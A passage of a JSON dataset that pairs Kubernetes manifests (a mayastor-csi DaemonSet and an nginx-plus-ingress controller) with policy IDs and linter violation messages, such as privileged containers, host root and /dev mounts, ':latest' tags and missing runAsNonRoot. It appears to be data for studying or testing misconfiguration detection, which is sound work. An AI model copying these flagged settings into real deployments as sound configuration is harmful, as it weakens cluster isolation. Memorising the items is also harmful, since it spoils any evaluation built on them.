    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mayastor-csi\" is using an invalid container image, \"mayadata/mayastor-csi:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3080",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "3081",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mayastor-csi\" does not have a read-only root file system"
  },
  {
    "id": "3082",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"mayastor-csi\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "3083",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"mayastor-csi\" is privileged"
  },
  {
    "id": "3084",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "3085",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mayastor-csi\" is not set to runAsNonRoot"
  },
  {
    "id": "3086",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"mayastor-csi\""
  },
  {
    "id": "3087",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"mayastor-csi\""
  },
  {
    "id": "3088",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/sys\" is mounted on container \"mayastor-csi\""
  },
  {
    "id": "3089",
    "manifest_path": "data/manifests/the_stack_sample/sample_0920.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-plus-ingress-rc\n  labels:\n    app: nginx-plus-ingress\nspec:\n  replicas: 1\n  selector:\n    app: nginx-plus-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-plus-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:1.0.0\n        name: nginx-plus-ingress\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n          hostPort: 8080\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - -nginx-plus\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-plus-ingress\" does not have a read-only root file system"
  },
  {
    "id": "3090",
    "manifest_path": "data/manifests/the_stack_sample/sample_0920.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-plus-ingress-rc\n  labels:\n    app: nginx-plus-ingress\nspec:\n  replicas: 1\n  selector:\n    app: nginx-plus-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-plus-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:1.0.0\n        name: nginx-plus-ingress\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n          hostPort: 8080\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - -nginx-plus\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"nginx-ingress\" not found"
  },
  {
    "id": "3091",
    "manifest_path": "data/manifests/the_stack_sample/sample_0920.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-plus-ingress-rc\n  labels:\n    app: nginx-plus-ingress\nspec:\n  replicas: 1\n  selector:\n    app: nginx-plus-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-plus-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:1.0.0\n        name: nginx-plus-ingress\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n          hostPort: 8080\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - -nginx-plus\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-plus-ingress\" is not set to runAsNonRoot"
  },
  {
    "id": "3092",
    "manifest_path": "data/manifests/the_stack_sample/sample_0920.yaml",
